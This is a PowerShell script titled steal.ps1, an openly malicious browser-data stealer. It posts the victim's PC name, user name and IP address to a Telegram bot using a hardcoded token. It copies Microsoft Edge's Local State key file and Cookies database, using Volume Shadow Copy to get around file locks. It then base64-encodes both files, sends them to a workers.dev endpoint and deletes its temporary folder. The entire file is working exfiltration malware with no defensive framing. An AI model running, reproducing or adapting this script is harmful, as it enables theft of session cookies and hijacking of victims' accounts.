# steal.ps1
# Uses Volume Shadow Copy to read locked Edge files.

$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"
$worker_url = "https://reciever.tyceno89.workers.dev"

# Send PC info to Telegram
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# --- Function to copy using Volume Shadow Copy ---
function Copy-WithVSS {
    param($src, $dst)
    # Create a shadow copy of C:
    $shadowOutput = vssadmin create shadow /for=C: 2>&1
    if ($LASTEXITCODE -ne 0) { return $false }
    # Extract Shadow ID
    $match = [regex]::Match($shadowOutput, "Shadow Copy ID: \{(.*)\}")
    if ($match.Success) {
        $shadowId = $match.Groups[1].Value
        $shadowDevice = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadowId\"
        $srcShadow = $shadowDevice + ($src -replace '^C:\\', '')
        try {
            Copy-Item $srcShadow $dst -Force -ErrorAction Stop
            $success = $true
        } catch {
            $success = $false
        }
        # Delete the shadow
        vssadmin delete shadows /shadow=$shadowId /quiet | Out-Null
        return $success
    }
    return $false
}

$temp = "$env:TEMP\exfil"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

$src_ls = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
$dst_ls = "$temp\Edge_LocalState.json"
$src_cookies = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$dst_cookies = "$temp\Edge_Cookies.db"

# Try normal copy, then VSS
$ls_ok = Copy-Item $src_ls $dst_ls -Force -ErrorAction SilentlyContinue
if (-not $ls_ok) { $ls_ok = Copy-WithVSS $src_ls $dst_ls }

$cookies_ok = Copy-Item $src_cookies $dst_cookies -Force -ErrorAction SilentlyContinue
if (-not $cookies_ok) { $cookies_ok = Copy-WithVSS $src_cookies $dst_cookies }

if (-not $ls_ok -or -not $cookies_ok) {
    $body = @{ chat_id = $c; text = "ERROR: Could not copy files" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body
    exit
}

# Read and encode
$bytes_ls = [System.IO.File]::ReadAllBytes($dst_ls)
$b64_ls = [Convert]::ToBase64String($bytes_ls)
$bytes_cookies = [System.IO.File]::ReadAllBytes($dst_cookies)
$b64_cookies = [Convert]::ToBase64String($bytes_cookies)

$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    files = @{
        "Edge_LocalState.json" = $b64_ls
        "Edge_Cookies.db" = $b64_cookies
    }
} | ConvertTo-Json -Depth 10

try {
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    $body = @{ chat_id = $c; text = "Both files sent successfully" }
} catch {
    $body = @{ chat_id = $c; text = "ERROR sending to worker: $_" }
}
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
